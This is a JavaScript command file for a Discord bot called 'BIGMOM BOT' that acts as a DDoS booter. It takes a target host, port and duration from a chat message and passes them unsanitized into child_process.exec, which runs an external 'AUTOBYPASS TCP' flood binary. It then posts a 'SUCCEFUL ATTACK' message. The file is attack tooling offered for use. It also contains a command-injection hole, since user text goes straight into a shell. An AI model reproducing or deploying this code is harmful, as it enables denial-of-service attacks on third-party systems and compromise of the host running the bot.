const Discord = require("discord.js");
const ms = require("ms");
const ping = require("ping");
const libquery = require("libquery");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const port = message.content.split (" ")[2]
const time = message.content.split (" ")[3]
const api = message.content.split (" ")[4]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

function Warn(message) {
  var embed0 = new Discord.MessageEmbed()
  .setTitle("WARNING!!")
  .setDescription(message)
  .setColor("RANDOM")
  return embed0;
}

function isLetter(c) {
  return c.toLowerCase() != c.toUpperCase();
}

// Example command
if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('WARRING')
	.setDescription("`contoh ;TCP target PORT TIME api`")
	.setFooter("GUNAKAN DENGAN BIJAK OKH!!!")
	message.channel.send(embed1);
	return;
	}

//BLACKLISTING SYSTEM 
 if (args[1] === "kontol") {
  message.channel.send(Warn("TARGET IS BLACKLISTED!"));
  return;
}
  if (Number(api) > ayarlar.apis) {
    message.channel.send(Warn("🚫 the api is out of tune ! 🚫"));
    return;
  }
  if (Number(api) < ayarlar.apis) {
    message.channel.send(Warn("🚫 the api is out of tune ! 🚫"));
    return;
  }
  if (isLetter(time)) {
    message.channel.send(Warn("time cannot contain characters!"));
    return;
  }
  if (isLetter(time)) {
    message.channel.send(Warn("Time cannot contain characters!"));
    return;
  }
  if (Number(time) > ayarlar.maxtime) {
    message.channel.send(Warn("🚫 Max time is " + ayarlar.maxtime + " seconds! 🚫"));
    return;
  }



// Command attack
var exec = require('child_process').exec
exec(`./AUTOBYPASS TCP ${host} ${port} ${time}`, (error, stdout, stderr) => {
});

// Start Attacking
setTimeout(function(){ 
    console.log('Start Attacking ID Discord:' +  message.guild.id)

const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('☢️ **BIGMOM BOT** ☢️')
	.setTimestamp()
  .setDescription("`SUCCEFUL ATTACK`")
	.setFooter('© Developer: YUKAI', client.user.avatarURL)
	.setTimestamp()
	.setImage(attackgif)
	.setThumbnail("")
 message.channel.send(embed);
 }, 5000); //time in milliseconds 1000 milliseconds = 1 seconds

// Attack Gif
var gifler = ["https://media.tenor.com/Oq1PYVh8AKAAAAAM/anime-lol.gif", "https://media.tenor.com/Oq1PYVh8AKAAAAAM/anime-lol.gif"];
    var attackgif = gifler[Math.floor((Math.random() * gifler.length))];

// Verify Gif
var gify = ["https://media.giphy.com/media/6036p0cTnjUrNFpAlr/giphy.gif"];
		var loadinggif = gify[Math.floor((Math.random() * gify.length))];

// Start Verify
console.log('Start Verify ID Discord:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **BIGMOM BOT** 🚀')
	.setTimestamp()
	.setDescription("**► 𝓟𝓵𝓮𝓪𝓼𝓮 𝔀𝓪𝓲𝓽 𝓯𝓸𝓻 𝓿𝓮𝓻𝓲𝓯𝓲𝓬𝓪𝓽𝓲𝓸𝓷 **")
	.setFooter('© Developer: YUKAI', client.user.avatarURL)
	.setTimestamp()
	.setImage(loadinggif)
	.setThumbnail("")
 message.channel.send(embed);
  }


exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['TCP'],
  permLevel: 0
}

exports.help = {
  name: 'TCP',
  description: 'YUKAI',
  usage: 'TCP'
}